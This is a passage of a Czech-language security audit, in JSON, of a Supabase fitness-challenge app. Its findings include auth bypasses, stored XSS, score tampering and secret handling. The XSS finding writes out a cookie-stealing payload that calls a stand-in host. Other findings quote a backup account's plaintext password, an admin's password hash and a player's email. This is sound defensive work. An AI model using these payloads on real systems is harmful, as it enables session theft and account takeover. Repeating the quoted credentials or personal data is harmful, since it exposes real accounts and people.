    "evidence": "index.html:3477-3514 (startLoginFlow, sha256, min 3 znaky), 3481-3484 (isAdminDevice bypass bez hesla), 3544-3548 (trvalý ADMIN_DEVICE_KEY v localStorage), 2495 (zápis password_hash)",
    "empiricallyTestable": true,
    "fix": "Odstranit celou legacy větev (startLoginFlow, sha256Hex, renderLoginScreen heslové prompty, resetPlayerPassword) a sloupec password_hash z DB. isAdmin odvozovat výhradně z players.is_admin přihlášeného účtu, ne z localStorage flagu (ADMIN_DEVICE_KEY používat max. jako UI cache, nikdy jako rozhodovací autoritu).",
    "dim": "see"
  },
  {
    "title": "Enumerace e-mailů přes signup (user_already_exists), reset endpoint enumeraci neumožňuje",
    "severity": "low",
    "area": "auth",
    "attack": "POST /auth/v1/recover vrací 200 jak pro existující, tak neexistující e-mail (ověřeno) — tudy enumerace nejde. Ale signup vrací rozlišitelnou chybu user_already_exists (index.html:2464 ji i lokalizuje na 'Tenhle e-mail už je registrovaný'), takže útočník přes signup zjistí, které e-maily mají účet. Praktický dopad je tu malý, protože e-maily hráčů jsou stejně čitelné přímo z players (viz nález o players_sel), ale samostatně jde o enumerační kanál.",
    "evidence": "Empiricky: /auth/v1/recover → HTTP 200 pro neexistující i existující e-mail; index.html:2464 (mapování user_already_exists na konkrétní hlášku)",
    "empiricallyTestable": true,
    "fix": "Po vyřešení primárního úniku e-mailů (players_sel) je to vedlejší. Pokud vadí: v Supabase zapnout 'Confirm email' (signup pak nevrací rozlišitelnou chybu hned) a v UI nehlásit explicitně 'e-mail už registrovaný', ale neutrální hlášku.",
    "dim": "see"
  },
  {
    "title": "Reset odkazu: redirectTo je fixní (bez open-redirectu), ale recovery session se chová jako plné přihlášení",
    "severity": "low",
    "area": "auth",
    "attack": "redirectTo = location.origin + location.pathname (mcSendReset, index.html:2531) — žádný uživatelský vstup, takže open-redirect nehrozí a Supabase by cizí URL stejně odmítl podle Redirect URL allowlistu. Pozor ale: po kliknutí na reset odkaz vznikne plná session (token v hashi type=recovery). Kód to ošetřuje synchronní detekcí pwRecovery (index.html:2181) a v loadData drží reset formulář (5752-5756), takže běžný uživatel nepropadne do appky. Reálné riziko je provozní: recovery odkaz je jednorázový JWT s expirací (GoTrue default ~1h / single-use), takže 'znovupoužitelnost' je v rukou konfigurace GoTrue, ne kódu. Doporučuji ověřit nastavení OTP/expirace.",
    "evidence": "index.html:2531 (redirectTo fixní), 2181-2184 (pwRecovery detekce), 5750-5756 (drží reset formulář), 2470 (mapování otp_expired/bad_jwt → 'odkaz vypršel/použit')",
    "empiricallyTestable": false,
    "fix": "Potvrdit v Supabase: Redirect URLs allowlist obsahuje jen produkční/test doménu; OTP expiry rozumně krátká; mailer link single-use. V kódu po úspěšném mcSetNewPassword zvážit db.auth.signOut() před reload, aby recovery session nepřežila do běžného provozu na sdíleném zařízení.",
    "dim": "see"
  },
  {
    "title": "Stored XSS přes jméno hráče (players.jmeno) — spustí se u VŠECH uživatelů včetně admina",
    "severity": "critical",
    "area": "xss",
    "attack": "Útočník je přihlášený a vlastní svůj profil. Pošle přímý PostgREST PATCH na svůj řádek players (RLS to povolí: id = current_player_id()), do sloupce jmeno uloží např. <img src=x onerror=\"fetch('https://evil/?c='+document.cookie)\"> nebo <img src=x onerror=\"db.from('players').update({is_admin:true}).eq('id', MOJE_ID)\">. Jméno hráče se vykresluje RAW přes innerHTML na žebříčku, přihlašovací obrazovce, kartách hráčů, kartičkách záznamů, v player-pills i v claim obrazovce — tedy úplně všem. Jakmile appku otevře KDOKOLIV jiný (hlavně admin), payload se spustí v JEHO session. Admin session projde current_is_admin() a útočníkův kód pak může z prohlížeče admina udělat cokoliv (nastavit is_admin, smazat data, povýšit útočníka). Žebříček/přihlašovací obrazovka se renderují i bez interakce, takže stačí appku načíst.",
    "evidence": "index.html: žádný globální escape; raw vložení jmena: ř.3124/3126 (leaderboard), ř.3192 (heatmap label), ř.3405 (history pills), ř.3463 (login screen — vidí i nepřihlášený), ř.3650/3765 (entry card / player card), ř.5197 a 5585 (player-pills/editor-pills), ř.2486-2487 (claim). Vše přes innerHTML s `${p.jmeno}`. RLS update vlastního profilu bez validace obsahu: F52-rls-v2.sql ř.50-60 (players_upd: id = public.current_player_id()). Escape funkce habitEsc() existuje jen pro habits (ř.4004), pro jmeno se nepoužívá nikde.",
    "empiricallyTestable": true,
    "fix": "1) Zavést jednu globální escape funkci (jako habitEsc na ř.4004) a obalit jí KAŽDÉ vložení uživatelského/DB textu do innerHTML — jmeno, barva, cvik, nazev, old/new_value. 2) Lépe: vykreslovat textové hodnoty přes textContent / createTextNode, ne přes template literál do innerHTML. 3) DB obrana (model browser→DB): přidat na players BEFORE INSERT/UPDATE trigger, který odmítne jmeno/barva s < > \" ' nebo je sanitizuje, případně CHECK constraint (jmeno ~ '^[^<>\"'']+$'). 4) Volitelně CSP bez 'unsafe-inline' pro skripty.",
    "dim": "see"
  },
  {
    "title": "Stored XSS přes název cviku/aktivity (cviky.cvik, aktivity.nazev) — cross-user na kartičkách záznamů",
    "severity": "critical",
    "area": "xss",
    "attack": "Útočník přes přímé API vloží do svého řádku cviky (sloupec cvik) nebo aktivity (sloupec nazev) hodnotu <img src=x onerror=...> (RLS povolí insert/update, kde player_id = current_player_id()). Název se vykresluje RAW jako title kartičky přes innerHTML. Kartičky cizích hráčů vidí každý v záložce Historie, v 'Posledních záznamech' na přehledu (renderRecent → renderEntryGroup → renderEntryCard) i v Day-detail a Player-entries modalech. Payload se tedy spustí u libovolného jiného uživatele/admina, který si tyto pohledy zobrazí. (Pozn.: poznamka se parsuje jako JSON a při selhání se zahodí, takže poznamka sama o sobě není přímý sink — zdrojem jsou cvik a nazev.)",
    "evidence": "index.html ř.3617 (title = `${e.cvik} × ...`), ř.3630-3631 (title = e.nazev), pak raw render ř.3652 `<div class=\"entry-title\">${title}</div>` přes innerHTML (volá se z renderRecent ř.3246, renderAllEntries ř.3284, openDayDetail ř.3224, renderPlayerEntries ř.3371). RLS: F52-rls-v2.sql ř.35-41 (cviky/aktivity insert/update with check player_id = current_player_id()). Žádný escape na title.",
    "empiricallyTestable": true,
    "fix": "Escapovat e.cvik a e.nazev (a obecně celý title/meta) před vložením do innerHTML, nebo plnit .entry-title přes textContent. Doplnit DB validaci/sanitizaci textových sloupců cvik/nazev (trigger nebo CHECK). Vykreslené číselné části (opakovani, pridana_vaha, body) jsou OK, problém jsou volné textové názvy.",
    "dim": "see"
  },
  {
    "title": "Stored XSS v historii úprav (player_history.old_value / new_value) — spustí se u toho, kdo otevře historii (typicky admin)",
    "severity": "high",
    "area": "xss",
    "attack": "Tabulka player_history je insertovatelná pro vlastní player_id (RLS, ř.35-41). Útočník vloží řádek s new_value = <img src=x onerror=...> (případně to vznikne i 'organicky' změnou jména na payload — uloží se do new_value). Modal 'Historie úprav' renderuje old_value/new_value RAW přes innerHTML. Historii cizího hráče otevírá hlavně admin (tlačítko je jen pro admina nebo vlastníka, ř.3847), takže payload typicky cílí přímo na admina.",
    "evidence": "index.html ř.5691: `<div class=\"change\"><strong>${label}:</strong> ${h.old_value || '—'} → ${h.new_value || '—'}</div>` vykresleno přes el.innerHTML (ř.5684). label je z FIELD_LABELS (konstanty) nebo h.field_name (taky neescapované — útočník řídí i field_name). Insert do player_history bez validace: F52-rls-v2.sql ř.35-41.",
    "empiricallyTestable": true,
    "fix": "Escapovat h.old_value, h.new_value i h.field_name před vložením, nebo skládat řádek přes textContent na jednotlivé span elementy. Ideálně doplnit DB sanitizaci sloupců old_value/new_value/field_name.",
    "dim": "see"
  },
  {
    "title": "CSS / atribut injection přes players.barva a habits.barva (style=...) — možný HTML breakout",
    "severity": "medium",
    "area": "xss",
    "attack": "barva se vkládá RAW dovnitř atributu style bez uvozovkového escapování: style=\"background:${p.barva}\". Útočník (úprava vlastního profilu přes API) může nastavit barva tak, aby buď (a) provedla CSS injection (např. načtení externího url přes url(), úprava layoutu/obsahu přes content/clip), nebo (b) v některých sincích, kde barva není v uvozovkách (--c:${p.barva}, --hc:${c}, --player-color:${p.barva}), vložila další deklarace. Přímý JS execution z CSS v moderních prohlížečích není (expression() je mrtvé), takže to není plný script-exec, ale je to data-exfiltrace přes url() / UI redressing a u sinků bez uvozovek riziko rozbití šablony. Hodnotnější je to jako doplněk k jmeno-XSS.",
    "evidence": "index.html ř.3124/3129 (background:${p.barva}, --player-color:${p.barva}), ř.3192 (color:${p.barva}), ř.3404 (background:${p.barva}), ř.3462/2486 (login/claim), ř.3649/3761 (entry/player card), ř.5197/5585 (--c:${p.barva}), habits ř.4426 (--hc:${c}), 4164 (background:${barva} v gradientu). Žádná validace, že barva je platná CSS barva.",
    "empiricallyTestable": true,
    "fix": "Validovat barva proti whitelistu (regex ^#[0-9a-fA-F]{3,8}$ nebo seznam povolených), případně escapovat a vždy dávat hodnotu do uvozovek. DB: CHECK constraint na players.barva / habits.barva.",
    "dim": "see"
  },
  {
    "title": "Self-XSS přes habits.ikona (a habit barva) — raw render ikony, low impact (jen vlastní data)",
    "severity": "low",
    "area": "xss",
    "attack": "Sloupec habits.ikona se vykresluje RAW (${h.ikona||'🎯'}) — ačkoliv UI nabízí jen pevný výběr emoji (HABIT_ICONS, ř.4744), přes přímé API lze do ikona uložit <img src=x onerror=...> (RLS povolí update vlastního habitu). Návyky se ale renderují VÝHRADNĚ pro přihlášeného hráče (currentHabitPlayer() = state.currentPlayerId, ř.4005), takže payload zasáhne jen samotného útočníka = self-XSS s nízkým dopadem. Pozor: kdyby v budoucnu admin/jiný hráč mohl zobrazit cizí návyky, eskaluje to na cross-user. Naopak habits.nazev/kotva/cil_jednotka JSOU escapované přes habitEsc — ty jsou v pořádku.",
    "evidence": "index.html raw ikona: ř.4215, 4250, 4284, 4428 (`${hb.ikona||'🎯'}` / `${h.ikona||'🎯'}`); habitEsc se na ikonu nepoužívá. View jen pro vlastního hráče: ř.4005 currentHabitPlayer(){ return state.currentPlayerId; }, renderNavyky/renderHabitStats filtrují h.player_id === pid.",
    "empiricallyTestable": true,
    "fix": "Escapovat i h.ikona (habitEsc), nebo validovat, že ikona je z povoleného seznamu HABIT_ICONS, případně omezit na jeden grafém. DB CHECK na délku/obsah ikona. Konzistentně dořešit, až bude existovat zobrazení cizích návyků.",
    "dim": "see"
  },
  {
    "title": "Potvrzeno: v index.html i ve skriptech je vystaven POUZE publishable (anon) klíč — žádný service_role/secret klíč nikde",
    "severity": "info",
    "area": "secrets / klíče Supabase",
    "attack": "N/A — toto je potvrzení správného stavu. Útočník získá z page source jen publishable klíč (sb_publishable_...), který je navržen jako veřejný. Service_role (full-bypass RLS) klíč nikde v kódu, skriptech ani JSON souborech není.",
    "evidence": "index.html:2167-2169 SUPABASE_KEY = isTest ? 'sb_publishable_vYqqqUeOuQ4idVCiCvwilQ_pIr5G08r' : 'sb_publishable_KEG-Sb3HMyk0RjjLF4q5-Q_h6ovbG1L'. Grep na sb_secret_ / service_role / 'role':'service_role' / eyJ...service_role v celém C:/Claude Code/tools/browser/ (mimo node_modules) i v index.html = 0 zásahů. Jediný výskyt 'service_role' je textová poznámka v komentáři db-backup.js:70.",
    "empiricallyTestable": true,
    "fix": "Žádná oprava potřeba. Publishable klíč JE schválně veřejný; bezpečnost stojí výhradně na RLS (správně). Doporučení: nikdy nepřidávat service_role klíč do index.html ani do skriptů commitnutých do gitu.",
    "dim": "see"
  },
  {
    "title": "Oddělení test vs prod klíčů je správné — v prod buildu nejsou test creds a naopak (oba jsou ale stejně jen anon)",
    "severity": "info",
    "area": "secrets / oddělení prostředí",
    "attack": "N/A. Volba prostředí je čistě podle hostname (isTest = hostname.includes('test'|'v1-'|'git-')). Prod doména (movement-challenge-blond.vercel.app) → prod URL+prod publishable klíč; test/preview domény → test. Oba klíče jsou v page source vidět zároveň, ale protože jde o anon klíče vázané na RLS, prozrazení test klíče v prod buildu (a naopak) nedává útočníkovi nic navíc nad rámec toho, co stejně dostane na příslušné doméně.",
    "evidence": "index.html:2160-2169 (isTest detekce + ternární výběr URL/KEY). Test URL dslutpijlwmyftztyfva, prod URL jqxvrooosecseugfzpsx odpovídají zadání.",
    "empiricallyTestable": true,
    "fix": "OK. Jediná drobnost: oba klíče (test i prod) jsou doručeny každému klientovi v jednom souboru. To není únik (jsou anon), ale čistší by bylo doručovat jen klíč pro dané prostředí (build-time env). Nízká priorita.",
    "dim": "see"
  },
  {
    "title": "Lokální prod/test zálohy DB (backups/*.json) obsahují legacy password_hash a e-maily hráčů v plaintext souborech na disku",
    "severity": "medium",
    "area": "secrets / data at rest",
    "attack": "Soubory C:/Claude Code/tools/browser/backups/*.json jsou snapshoty CELÉ produkční i testovací DB včetně sloupce password_hash (starý nesolený SHA-256) a od novějších snapshotů i e-mailů hráčů. Kdokoli s přístupem k tomuto stroji/adresáři (jiný malware, sdílený disk, omylem přibalené do archivu) získá hashe všech hesel — nesolený SHA-256 jde u slabých/krátkých hesel (appka povoluje min. 3 znaky pro legacy flow!) triviálně prolomit přes rainbow table / brute-force. Mára (admin) má password_hash 90c84fa5...; e-mail mara.kadrmas@gmail.com je v test záloze.",
    "evidence": "backups/prod-2026-06-04T05-43-16.json: players[0] = {jmeno:'Mára', is_admin:true, password_hash:'90c84fa5cd25bee830e58064281a5dc9bcf8d7ee72746cdfad1ec45dc8c036ae'}. 6x password_hash v jednom prod snapshotu. backups/test-2026-06-29T11-31-54.json obsahuje \"email\":\"mara.kadrmas@gmail.com\". index.html:3490 povoluje legacy heslo už od 3 znaků (pass1.length < 3).",
    "empiricallyTestable": false,
    "fix": "1) Tyto zálohy NEcommitovat (ověřeno: tokens/+backups/ jsou v .gitignore a tools/browser není git repo — dobře). 2) Při plánovaném redesignu auth zrušit sloupec password_hash úplně (Supabase Auth už hesla řeší solenė/bcrypt na serveru) a zálohy bez něj. 3) Staré snapshoty s hashi smazat / přesunout do šifrovaného úložiště. 4) db-backup.js by měl password_hash a email z exportu vynechávat (whitelist sloupců místo select=*).",
    "dim": "see"
  },
  {
    "title": "Natvrdo zapsané heslo zálohovacího účtu v db-backup.js",
    "severity": "low",
    "area": "secrets / hardcoded credentials",
    "attack": "db-backup.js obsahuje plaintext login zálohovacího účtu pro TEST DB (mc-backup@movement.local / Backup-MC-2026-xY7q). Tento účet se přihlašuje přes Supabase Auth, takže přes RLS čte VŠECHNA data (přihlášený = čte vše). Kdo získá tento soubor, přečte přes anon endpoint celou test DB. Riziko je omezené: (a) je to jen test prostředí, (b) soubor není v gitu (tools/browser není repo) a leží jen lokálně. Pro prod jsou creds záměrně null (řádek 22: 'DOPLNIT při cutoveru').",
    "evidence": "db-backup.js:20-23 BACKUP_AUTH = { test: { email: 'mc-backup@movement.local', password: 'Backup-MC-2026-xY7q' }, prod: null }",
    "empiricallyTestable": true,
    "fix": "Přesunout creds do env proměnné / lokálního .env (gitignored) místo do .js. Pro prod (až se doplní) NIKDY nehardcodovat — použít env. Zvážit, zda zálohovací účet vůbec potřebuje plný read přes RLS, nebo raději server-side cron se service_role klíčem mimo klientský kód.",
    "dim": "see"
  },
  {
    "title": "Potvrzeno: žádné tokeny třetích stran, žádné citlivé komentáře, žádné .env soubory s tajemstvími",
    "severity": "info",
    "area": "secrets / třetí strany a komentáře",
    "attack": "N/A. Grep na ghp_/github_pat/VERCEL_TOKEN/sendgrid/resend/mailgun/smtp/Bearer <literal> nenašel žádný reálný token třetí strany. 'faketoken' v _live-rec.js je zjevně fiktivní testovací string pro reset-flow. tokens/movement-challenge.json obsahuje jen veřejné Vercel preview URL + poznámku, že Vercel Authentication je pro preview vypnutá (žádný token). Komentáře v index.html nic neprozrazují (jen popisy funkcí F-čísel).",
    "evidence": "_live-rec.js:3 URL '...#access_token=faketoken...' (fiktivní). tokens/movement-challenge.json: jen previewUrl/productionUrl + authMode 'public-preview' (žádné creds). Grep ghp_/github_pat/VERCEL_TOKEN/smtp/resend/mailgun/sendgrid přes tools/browser = 0 reálných zásahů.",
    "empiricallyTestable": false,
    "fix": "Žádná oprava. Pozn.: tokens/movement-challenge.json dokumentuje, že Vercel preview deploys jsou veřejné bez tokenu — to je info, ne tajemství; preview URL = stejná appka na test DB, chráněná RLS, takže OK.",
    "dim": "see"
  },
  {
    "title": "Skóre (body) se počítá výhradně na klientovi a posílá se do DB jako obyčejný sloupec — žádná serverová validace ani přepočet",
    "severity": "high",
    "area": "logic / integrita skóre",
    "attack": "Útočník (přihlášený hráč) pošle přímý PostgREST POST na /rest/v1/cviky nebo /rest/v1/aktivity s libovolně vysokým body, např. {\"player_id\":\"<moje id>\",\"cvik\":\"Shyby\",\"opakovani\":1,\"body\":999999,\"datum\":\"2026-06-29\"}. RLS pustí insert, protože player_id == current_player_id(); hodnota body se vůbec nekontroluje. Tím se okamžitě dostane na 1. místo v žebříčku. Stejně lze udělat UPDATE existujícího vlastního řádku na vyšší body. Funkce vypocitejBodyCvik/vypocitejBodyCvikVaried/vypocitejBodyLezeni (index.html:2603-2756) jsou jen klientská kosmetika — DB integerová/numerická hodnota se bere taková, jaká přijde.",
    "evidence": "index.html:5295,5318,5329 (totalBody = vypocitejBodyCvik(...); payload.body = totalBody; db.from('cviky').insert(payload)); index.html:5348,5356,5366 (body = LEVEL_POINTS[...]; insert aktivity); index.html:5405,5410 (body = vypocitejBodyLezeni; insert). F52-rls-v2.sql:39-40 — insert/update policy kontroluje JEN player_id, žádný with check na sloupec body. Žádný BEFORE trigger, který by body přepočítal, v žádném *.sql neexistuje (grep CHECK/constraint/trigger nenašel nic pro cviky/aktivity).",
    "empiricallyTestable": true,
    "fix": "Skóre nesmí přijímat klient. Dvě varianty: (A) BEFORE INSERT/UPDATE trigger na cviky/aktivity v SECURITY DEFINER funkci, který body PŘEPOČÍTÁ ze vstupů (cvik, opakovani, pridana_vaha, poznamka, profil hráče) a NEW.body přepíše — klientskou hodnotu ignoruje; (B) zápis přes RPC/Edge Function, kde se body počítá serverově a tabulky mají přímý insert zakázaný. Vzhledem k tomu, že vzorec závisí i na profilu (vaha, max_*), je nutné ho zduplikovat v SQL. Realisticky pro výzvu 7 přátel medium, ale je to jádro 'férovosti' celé appky.",
    "dim": "see"
  },
  {
    "title": "Žádné DB CHECK constraints na cviky/aktivity — lze zapsat extrémní, záporné nebo nesmyslné hodnoty (body, opakovani, km, pridana_vaha)",
    "severity": "medium",
    "area": "logic / validace rozsahů",
    "attack": "Přímým API insertem lze zapsat body = 1e9, opakovani = -5, km = -100, pridana_vaha = 99999, nebo body = NaN/Infinity (resp. velmi velké číslo). Záporné body by mohly i poškodit cizí pozice v žebříčku přepočtem, ale hlavně rozbijí součty a statistiky. Integrita je vynucena jen v UI (parseInt, validace 'op < 1' apod. na index.html:5292,5300-5301), což přímé API obejde. Constraint existuje POUZE pro habit_logs.hodnota (F52-integrity.sql:18).",
    "evidence": "F52-integrity.sql obsahuje jen habit_logs_hodnota_nonneg CHECK (hodnota >= 0) a unikátní index na habit_logs — nic pro cviky/aktivity. grep 'CHECK|constraint' přes všechny *.sql potvrzuje, že cviky/aktivity nemají žádný CHECK na body/opakovani/km/pridana_vaha. Klientská validace index.html:5292 ('!op || op < 1') běží jen v prohlížeči.",
    "empiricallyTestable": true,
    "fix": "Přidat CHECK constraints: cviky CHECK (opakovani > 0 AND opakovani <= rozumný_strop AND body >= 0 AND body <= strop AND pridana_vaha >= 0); aktivity CHECK (body >= 0 AND body <= strop AND (km IS NULL OR km >= 0)). Pokud se zavede serverový přepočet body (nález výše), strop na body z přepočtu vyřeší většinu z toho automaticky; constraints na opakovani/km/pridana_vaha přidat tak jako tak.",
    "dim": "see"
  },
  {
    "title": "Smyšlené datum záznamu (datum) — zpětně i do budoucnosti — bez jakékoli serverové kontroly",
    "severity": "low",
    "area": "logic / časová integrita",
    "attack": "Datum záznamu pochází z getEntryDate() = state.selectedDate (index.html:5003-5005), nastaveného klientským date pickerem. UI sice budoucí dny blokuje (renderDatePicker: future cell nemá onclick, index.html:4978-4979; habits navíc 'sel > todayStr()' guardy na 4442/4464), ale přímý API insert/update může nastavit datum kamkoli — minulost (zpětné dohánění výzvy za dny, kdy se necvičilo) i budoucnost. DB sloupec datum nemá CHECK ani trigger. U výzvy s pravidly 'počítá se jen tento týden' to umožní podvádět s časovými okny.",
    "evidence": "index.html:5331,5357,5383,5411 (datum: getEntryDate()); getEntryDate index.html:5003-5005; UI guard jen klientský index.html:4978-4979 (isFuture → bez onclick) a 4442/4464 ('if (sel > todayStr()) return'). Žádný CHECK na datum v žádném *.sql.",
    "empiricallyTestable": true,
    "fix": "Pokud má výzva časové hranice, vynutit je v DB: trigger/CHECK že datum <= current_date (zákaz budoucnosti) a případně datum >= datum_startu_vyzvy. Pro retroaktivní zápisy zvážit povolení jen N dní zpět. Bez serverové kontroly je date picker jen kosmetika.",
    "dim": "see"
  },
  {
    "title": "Manipulace skóre/žebříčku CIZÍCH hráčů je RLS blokována pro ne-adminy (potvrzení, ne nová díra) — ale admin a 'claim' díra zůstávají rizikem",
    "severity": "low",
    "area": "logic / vlastnictví řádků",
    "attack": "Formulář umožní v UI vybrat libovolného aktivního hráče (state.selectedPlayer = pill.dataset.playerId, index.html:5207) a payload pak nese cizí player_id (index.html:5325). Pro NE-admina RLS insert/update toto zablokuje (player_id != current_player_id()), takže cizí žebříček přímo nafouknout nelze — to je správně. ALE: (1) admin smí zapisovat komukoli cokoli s libovolným body (z podstaty), (2) dokud na PROD neběží players_guard_admin (F52-rls-adminlock.sql je dle zadání NESPUŠTĚNÝ), kdokoli se povýší na admina a pak může manipulovat skóre všech. Tj. manipulace cizího žebříčku je dosažitelná řetězením s admin-eskalací.",
    "evidence": "index.html:5196-5207 (pill umožní výběr kteréhokoli aktivni hráče, nastaví state.selectedPlayer); index.html:5325 (player_id: state.selectedPlayer). RLS F52-rls-v2.sql:39 (with check player_id = current_player_id() or current_is_admin()) — pro ne-admina blok OK. Zadání: F52-rls-adminlock.sql zatím nespuštěn → admin-eskalace otevřená.",
    "empiricallyTestable": true,
    "fix": "Spustit F52-rls-adminlock.sql (uzavře admin-eskalaci, čímž padá i tato řetězená cesta). UI výběr cizího hráče pro zápis pro ne-adminy je matoucí (uživatel dostane RLS chybu) — buď nabízet jen vlastní profil, nebo to nechat (RLS to stejně ubrání). Hlavní zbytek je důvěra v admina, což je u 7 přátel akceptovatelné.",
    "dim": "see"
  },
  {
    "title": "Unikátní index habit_logs(habit_id,player_id,datum) brání duplicitám, ale 'hodnota' návyku lze nafouknout/zfalšovat přímým API",
    "severity": "low",
    "area": "logic / návyky",
    "attack": "Obejít unique index NELZE (DB ho vynutí, F52-integrity.sql:13 — to je dobře; duplicitní insert vrátí 23505). Constraint hodnota >= 0 brání záporným (F52-integrity.sql:18 — dobře). ZBÝVÁ ale: hodnota nemá horní mez ani vazbu na cíl návyku — přímým insertem lze zapsat hodnota = 1e9 pro vlastní habit_log; a žádná kontrola, že datum spadá do habits.zacatek..konec. Klient to validuje (val <= 0 → clear, index.html:4530), API ne. Dopad na 'férovost' je malý, protože návyky obvykle nejdou do hlavního žebříčku bodů, ale statistiky/streaky zkreslit lze.",
    "evidence": "F52-integrity.sql:13 (UNIQUE INDEX habit_logs_unique_day — funguje), :18 (CHECK hodnota >= 0). Chybí horní mez a vazba na cíl/období. index.html:4456,4537,4560 (insert habit_logs s klientskou hodnotou full/val/null). Klientský guard jen index.html:4530.",
    "empiricallyTestable": true,
    "fix": "Volitelně přidat horní CHECK na habit_logs.hodnota (rozumný strop) a případně trigger ověřující datum v intervalu habits.zacatek..konec a datum <= current_date. Priorita nízká — unique a non-neg constraint už pokrývají hlavní integritu.",
    "dim": "see"
  },
  {
    "title": "Profilové vstupy do vzorce (vaha, max_*) jdou plně zmanipulovat na vlastním profilu → nepřímé nafouknutí body i bez přímého zápisu body",
    "severity": "low",
    "area": "logic / vstupy vzorce",
    "attack": "I kdyby se body počítalo serverově, vzorec vychází z players.vaha a players.max_shyby/drep/kliky/dipy/boulder/lano (index.html:2603-2756). Tyto sloupce si hráč na svém profilu legitimně mění (players_upd dovolí self-update). Nastavením např. vaha extrémně nízko nebo max_* tak, aby proc/rel vyšlo vysoké, lze body legálně nafouknout. Bez constraintů na rozsah těchto sloupců (žádné v *.sql) jde i o nesmyslné hodnoty (vaha = 1, max_shyby = 1).",
    "evidence": "index.html:2605-2613 (wk = wilksKoef(player.vaha,...); proc = (op*rel)/player.max_shyby) atd.; profil update index.html:5612-5626,5646 (db.from('players').update(newValues)). Žádný CHECK na players.vaha/vyska/max_* v žádném *.sql.",
    "empiricallyTestable": true,
    "fix": "Přidat CHECK na players (vaha rozumný interval např. 30-250, vyska 100-250, max_* >= 0 a <= strop). Zvážit, zda změny max_* (osobní rekordy) mají měnit minulé skóre — pokud body počítá server při zápisu, je 'zafixované' vstupy z času zápisu; pak pozdější změna profilu zpětně neškálí stará body. To je férovější model.",
    "dim": "see"
  },
  {
    "title": "player_history.changed_by_player_id je klientem volně nastavitelné — lze zfalšovat autora změny ve vlastní historii",
    "severity": "info",
    "area": "logic / audit trail",
    "attack": "Při úpravě vlastního profilu se do player_history zapisuje changed_by_player_id = state.editorPlayer (index.html:5652), což je klientská hodnota. RLS na player_history kontroluje jen player_id (= editovaný hráč), ne changed_by_player_id. Hráč tedy může do své historie zapsat, že změnu provedl někdo jiný (např. admin), nebo naopak. Audit trail proto není důvěryhodný. Dopad nízký — historie je informativní.",
    "evidence": "index.html:5650-5657 (historyRows: changed_by_player_id: state.editorPlayer, insert do player_history). F52-rls-v2.sql:39 — insert policy kontroluje jen player_id = current_player_id(); changed_by_player_id nevaliduje.",
    "empiricallyTestable": true,
    "fix": "Buď changed_by_player_id nastavovat serverově (trigger: NEW.changed_by_player_id := current_player_id()), nebo přidat with check, že changed_by_player_id = current_player_id() (resp. povolit jen admina jako cizího autora). Pokud historie není bezpečnostně relevantní, lze ponechat a brát jako info.",
    "dim": "see"
  }
]
```
